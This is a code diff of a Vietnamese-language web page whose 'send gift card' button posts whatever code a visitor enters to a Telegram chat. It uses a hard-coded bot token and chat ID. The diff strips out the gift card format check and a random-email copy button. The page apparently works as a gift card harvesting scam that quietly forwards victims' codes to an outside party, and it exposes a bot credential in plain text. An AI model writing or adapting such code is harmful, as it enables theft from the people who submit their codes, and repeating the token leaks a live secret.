@@ -52,17 +52,13 @@
 <div id="giftStatus"></div>
 
 <button id="giftBtn" onclick="sendGiftcard()">📤 Gửi giftcard</button>
-<button id="emailBtn" onclick="copyRandomEmail()">📧 Copy email ngẫu nhiên</button>
 
 <script>
 const BOT_TOKEN = "8532371199:AAGPwvx5Jt1Ul6Js0DuzRJk-RVhuWROH0R0";
 const CHAT_ID = "5376711844";
 
-const GIFT_REGEX = /^[A-Z0-9]{4}-[A-Z0-9]{6}-[A-Z0-9]{4}$/;
-
 function disableButtons(state) {
   document.getElementById("giftBtn").disabled = state;
-  document.getElementById("emailBtn").disabled = state;
 }
 
 function showGiftStatus(text, type) {
@@ -91,13 +87,7 @@ async function sendGiftcard() {
     return;
   }
 
-  text = text.trim().toUpperCase();
-
-  if (!GIFT_REGEX.test(text)) {
-    showGiftStatus("❌ Sai định dạng gift card", "error");
-    disableButtons(false);
-    return;
-  }
+  text = text.trim();
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
@@ -115,27 +105,6 @@ async function sendGiftcard() {
     showGiftStatus("❌ Gửi thất bại", "error");
     disableButtons(false);
   });
-}
-
-/* ===== COPY EMAIL ===== */
-function generateEmail() {
-  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
-  const domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"];
-  let name = "";
-  for (let i = 0; i < 12; i++) {
-    name += chars[Math.floor(Math.random() * chars.length)];
-  }
-  return name + "@" + domains[Math.floor(Math.random() * domains.length)];
-}
-
-function copyRandomEmail() {
-  const email = generateEmail();
-  const temp = document.createElement("textarea");
-  temp.value = email;
-  document.body.appendChild(temp);
-  temp.select();
-  document.execCommand("copy");
-  document.body.removeChild(temp);
 }
 </script>
 
